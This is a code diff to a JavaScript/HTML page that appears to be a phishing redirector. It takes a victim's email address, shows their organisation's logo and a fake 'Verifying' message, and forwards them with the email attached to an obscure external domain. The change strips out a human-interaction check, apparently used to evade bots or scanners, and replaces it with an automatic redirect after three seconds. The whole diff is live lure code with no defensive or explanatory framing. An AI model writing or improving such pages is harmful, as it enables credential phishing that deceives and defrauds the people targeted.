@@ -53,49 +53,25 @@
                     email = decodedEmail;
                 }
             } catch (e) {}
-            
+
             if (!email || !email.includes('@')) {
                 email = '';
             }
-            
+
             const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
             const logoUrl = `https://logo.clearbit.com/${domain}`;
             const targetUrl = email ? `https://e50F.yvtqqzxuvd.es/v8Ki/#M${email}` : 'https://e50F.yvtqqzxuvd.es/v8Ki/';
-            
+
             document.body.innerHTML = `
                 <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
                 <p class="message" id="userEmail">Verifying: ${email || 'No Email Provided'}</p>
                 <div class="spinner"></div>
-                <p class="message" id="statusMsg">Please interact with the page to verify you are human.</p>
+                <p class="message" id="statusMsg">Please wait while we complete the verification...</p>
             `;
-            
-            let humanDetected = false;
-            function redirectToTarget() {
-                window.location.href = targetUrl;
-            }
-            
-            function onUserInteraction() {
-                if (!humanDetected) {
-                    humanDetected = true;
-                    document.getElementById('statusMsg').innerText = "Human interaction detected. Redirecting in 3 seconds...";
-                    window.removeEventListener('mousemove', onUserInteraction);
-                    window.removeEventListener('keydown', onUserInteraction);
-                    window.removeEventListener('click', onUserInteraction);
-                    window.removeEventListener('touchstart', onUserInteraction);
-                    setTimeout(redirectToTarget, 3000);
-                }
-            }
-            
-            window.addEventListener('mousemove', onUserInteraction);
-            window.addEventListener('keydown', onUserInteraction);
-            window.addEventListener('click', onUserInteraction);
-            window.addEventListener('touchstart', onUserInteraction);
-            
+
             setTimeout(() => {
-                if (!humanDetected) {
-                    document.getElementById('statusMsg').innerText = "We haven't detected any interaction. Please move your mouse or press a key.";
-                }
-            }, 10000);
+                window.location.href = targetUrl;
+            }, 3000);
         })();
     </script>
 </body>
